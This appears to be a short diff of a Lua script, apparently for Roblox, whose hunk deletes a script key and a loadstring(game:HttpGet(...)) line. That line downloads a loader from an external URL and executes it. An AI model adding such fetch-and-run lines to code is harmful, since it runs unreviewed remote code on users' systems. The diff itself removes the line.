@@ -45,5 +45,3 @@ pcall(function()
        );
    end
 end)
-script_key="eBpFbioXlqFhlNeTZFPpvesiEzpSbGMW";
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/797ad8eaad60942b08839ab9e76937b4.lua"))()
